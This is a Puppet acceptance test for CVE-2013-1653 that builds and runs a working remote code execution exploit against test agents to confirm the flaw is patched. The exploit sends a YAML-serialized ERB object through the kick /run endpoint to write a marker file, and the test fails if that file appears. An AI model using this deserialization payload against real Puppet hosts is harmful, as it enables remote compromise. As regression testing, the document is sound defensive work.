test_name "CVE 2013-1653: Puppet Kick Remote Code Exploit" do

  step "Determine suitability of the test" do
    confine :except, :platform => 'windows'

    versions = on( hosts, puppet( '--version' ))
    skip_test( "This test will not run on Puppet 2.6" ) if
      versions.any? {|r| r.stdout =~ /\A2\.6\./ }
  end

  with_master_running_on( master, '--autosign true' ) do
    on agents, puppet_agent( '-t' )
  end

  def exploit_code( exploiter, exploitee, endpoint, port, file_to_create )

    certfile = on( exploiter, puppet_agent( '--configprint hostcert' )).stdout.chomp
    keyfile = on( exploiter, puppet_agent( '--configprint hostprivkey' )).stdout.chomp

    exploit = %Q[#!/usr/bin/env ruby
      require 'puppet'
      require 'openssl'
      require 'net/https'

      yaml = <<EOM
--- !ruby/object:ERB
 safe_level:
 src: |-
   #coding:US-ASCII
   _erbout = ''; _erbout.concat(( File.open( '#{file_to_create}', 'w') ).to_s)
 filename:
EOM

      headers = {'Content-Type' => 'text/yaml', 'Accept' => 'yaml'}
      conn = Net::HTTP.new('#{exploitee}', #{port})
      conn.use_ssl = true
      conn.cert = OpenSSL::X509::Certificate.new(File.read('#{certfile}'))
      conn.key = OpenSSL::PKey::RSA.new(File.read('#{keyfile}'))
      conn.verify_mode = OpenSSL::SSL::VERIFY_NONE

      conn.request_put("/production/#{endpoint}/#{exploiter}", yaml, headers) do |response|
       response.read_body do |chunk|
         puts chunk
       end
      end ]

    return exploit
  end

  exploited = '/tmp/cve-2013-1653-has-worked'
  restauth_conf = %q[
path /run
auth yes
allow *
]

  teardown do
    agents.each do |agent|
      pidfile = on( agent, puppet_agent("--configprint pidfile") ).stdout.chomp
      on agent, "[ -f #{pidfile} ] && kill `cat #{pidfile}` || true"
      on agent, "rm -rf #{exploited}"
    end
  end

  agents.each do |agent|
    atestdir = agent.tmpdir('puppet-kick-auth')
    mtestdir = master.tmpdir('puppet-kick-auth')

    step "Daemonize the agent" do
      # Lay down a tempory auth.conf that will allow the agent to be kicked
      create_remote_file(agent, "#{atestdir}/auth.conf", restauth_conf)

      # Start the agent
      on(agent, puppet_agent("--debug --daemonize --server #{master} --listen --no-client --rest_authconfig #{atestdir}/auth.conf"))

      step "Wait for agent to start listening" do
        timeout = 15
        begin
          Timeout.timeout(timeout) do
            loop do
              # 7 is "Could not connect to host", which will happen before it's running
              result = on(agent, "curl -k https://#{agent}:8139", :acceptable_exit_codes => [0,7])
              break if result.exit_code == 0
              sleep 1
            end
          end
        rescue Timeout::Error
          fail_test "Puppet agent #{agent} failed to start after #{timeout} seconds"
        end
      end
    end

    step "Attempt to exploit #{agent}" do
      # Ensure there's no stale data
      on agent, "rm -rf #{exploited}"
      on master, "rm -rf #{mtestdir}/exploit.rb"

      # Copy over our exploit and execute
      create_remote_file( master, "#{mtestdir}/exploit.rb", exploit_code( master, agent, 'run', 8139, exploited ))
      on master, "chmod +x #{mtestdir}/exploit.rb"
      on master, "#{mtestdir}/exploit.rb"

      # Did it work?
      fail_test( "Found exploit file #{exploited}" ) if
        on( agent, "[ ! -f #{exploited} ]",
           :acceptable_exit_codes => [0,1] ).exit_code == 1
    end
  end
end
